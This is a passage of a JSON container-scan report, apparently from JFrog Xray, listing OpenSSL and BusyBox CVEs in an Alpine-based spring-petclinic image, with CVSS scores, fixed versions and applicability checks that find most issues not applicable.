            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2021-3712",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2021-3712",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-183483",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1l-r0"
            ],
            "fixed_versions": [
               "1.1.1l-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3712",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2021-3712",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2021-3712",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-230458",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1q-r0"
            ],
            "fixed_versions": [
               "1.1.1q-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2097",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-230458",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper implementation of the AES encryption in OpenSSL may cause data leakage.",
            "FullDescription": "[`OpenSSL's`](https://openssl.org) implementation for `Advanced Encryption Standard (AES)` in `Offset CodeBook mode (OCB)` used for block ciphers may neglect to encrypt some of the data. This issue only affects 32bit x86 platforms, and could result in either exposing 16 bytes of preexisting data in the program's memory, or 16 bytes of plaintext when performing \"in place\" encryption.\n\nTLS and DTLS are not affected, since OpenSSL doesn't support OCB based cipher suites for these communication methods.\n\nA program is vulnerable if it uses any of the AES OCB encryption methods, `EVP_aes_128_ocb`, `EVP_aes_192_ocb` or `EVP_aes_256_ocb`, when EVP encryption is initialized. For instance:\n\n```\nEVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);\n```",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Use of OCB mode is uncommon and does not affect TLS and DTLS",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "This vulnerability only applies to 32bit x86 platforms using in-place AES encryption in OCB mode",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "Data that should have been encrypted will be exposed in the case of \"in place\" encryption, whereas in other cases unknown preexisting data from the memory may be exposed",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220705.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-2097",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-2097",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-230458",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1q-r0"
            ],
            "fixed_versions": [
               "1.1.1q-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2097",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised implementation will not encrypt the entirety of the data under some circumstances. This could reveal sixteen bytes of data that was preexisting in the memory that wasn't written. In the special case of \"in place\" encryption, sixteen bytes of the plaintext would be revealed. Since OpenSSL does not support OCB based cipher suites for TLS and DTLS, they are both unaffected. Fixed in OpenSSL 3.0.5 (Affected 3.0.0-3.0.4). Fixed in OpenSSL 1.1.1q (Affected 1.1.1-1.1.1p).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-230458",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper implementation of the AES encryption in OpenSSL may cause data leakage.",
            "FullDescription": "[`OpenSSL's`](https://openssl.org) implementation for `Advanced Encryption Standard (AES)` in `Offset CodeBook mode (OCB)` used for block ciphers may neglect to encrypt some of the data. This issue only affects 32bit x86 platforms, and could result in either exposing 16 bytes of preexisting data in the program's memory, or 16 bytes of plaintext when performing \"in place\" encryption.\n\nTLS and DTLS are not affected, since OpenSSL doesn't support OCB based cipher suites for these communication methods.\n\nA program is vulnerable if it uses any of the AES OCB encryption methods, `EVP_aes_128_ocb`, `EVP_aes_192_ocb` or `EVP_aes_256_ocb`, when EVP encryption is initialized. For instance:\n\n```\nEVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);\n```",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Use of OCB mode is uncommon and does not affect TLS and DTLS",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "This vulnerability only applies to 32bit x86 platforms using in-place AES encryption in OCB mode",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "Data that should have been encrypted will be exposed in the case of \"in place\" encryption, whereas in other cases unknown preexisting data from the memory may be exposed",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220705.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-2097",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function EVP_EncryptInit_ex is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-2097",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607987",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.1-r0"
            ],
            "fixed_versions": [
               "3.1.1-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2650",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-2650",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable functions of OpenSSL are not called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-2650",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607987",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.1-r0"
            ],
            "fixed_versions": [
               "3.1.1-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2650",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-2650",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable functions of OpenSSL are not called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-2650",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-539897",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.36.1-r27"
            ],
            "fixed_versions": [
               "1.36.1-r27"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42363",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2023-42363",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable `awk` is never used from the `Busybox` suite tool",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2023-42363",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-539897",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.36.1-r27"
            ],
            "fixed_versions": [
               "1.36.1-r27"
            ],
            "more_details": {
               "cves": [
